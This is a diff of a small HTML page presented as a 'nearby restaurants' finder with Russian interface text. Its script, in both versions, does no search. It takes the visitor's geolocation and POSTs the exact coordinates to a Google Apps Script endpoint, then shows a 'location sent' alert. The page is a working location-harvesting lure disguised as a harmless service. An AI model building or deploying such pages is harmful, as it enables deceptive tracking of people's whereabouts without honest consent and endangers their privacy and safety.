@@ -1,90 +1,73 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Рестораны рядом</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Nearby Restaurants</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
     body {
       margin: 0;
-      padding: 0;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: linear-gradient(145deg, #f2f3f5, #dfe1e5);
-      height: 100vh;
+      background: linear-gradient(120deg, #f0f4ff, #e0e7ff);
       display: flex;
       align-items: center;
       justify-content: center;
-    }
-    .container {
-      background: #fff;
-      padding: 40px;
-      border-radius: 20px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      height: 100vh;
+      flex-direction: column;
+      color: #333;
       text-align: center;
-      max-width: 400px;
-      width: 100%;
-      animation: fadeIn 0.6s ease;
-    }
-    h1 {
-      font-size: 24px;
-      margin-bottom: 20px;
-      color: #1c1c1e;
     }
     button {
-      padding: 12px 24px;
+      padding: 12px 20px;
       font-size: 16px;
       border: none;
-      border-radius: 12px;
-      background: #007aff;
+      border-radius: 10px;
+      background-color: #007aff;
       color: white;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       cursor: pointer;
       transition: background 0.3s ease;
     }
     button:hover {
-      background: #005ecb;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
+      background-color: #005edb;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Найти рестораны рядом</h1>
-    <button onclick="sendLocation()">Разрешить геолокацию</button>
-  </div>
+  <h1>🔍 Поиск ресторанов рядом</h1>
+  <p>Нажми кнопку, чтобы разрешить геолокацию</p>
+  <button onclick="sendLocation()">Разрешить геолокацию</button>
 
   <script>
     function sendLocation() {
-      if (!navigator.geolocation) {
-        alert("Геолокация не поддерживается этим браузером");
-        return;
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            fetch("https://script.google.com/macros/s/AKfycbxTAWCfHrAsc-WnOEAxqPRhu5jfo9vYYWI4936zL7d6rcS1Q3_lIKoE3E4BBFz-b7UB/exec", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+              }),
+            })
+              .then((response) => response.text())
+              .then((data) => {
+                alert("Геолокация отправлена!");
+              })
+              .catch((error) => {
+                alert("Ошибка при отправке: " + error);
+              });
+          },
+          (error) => {
+            alert("Ошибка геолокации: " + error.message);
+          }
+        );
+      } else {
+        alert("Геолокация не поддерживается на этом устройстве.");
       }
-
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          const data = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude
-          };
-
-          fetch("https://script.google.com/macros/s/AKfycbxTAWCfHrAsc-WnOEAxqPRhu5jfo9vYYWI4936zL7d6rcS1Q3_lIKoE3E4BBFz-b7UB/exec", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-          })
-          .then(res => res.text())
-          .then(() => alert("Координаты отправлены!"))
-          .catch(err => alert("Ошибка: " + err.message));
-        },
-        err => alert("Ошибка получения геолокации: " + err.message)
-      );
     }
   </script>
 </body>
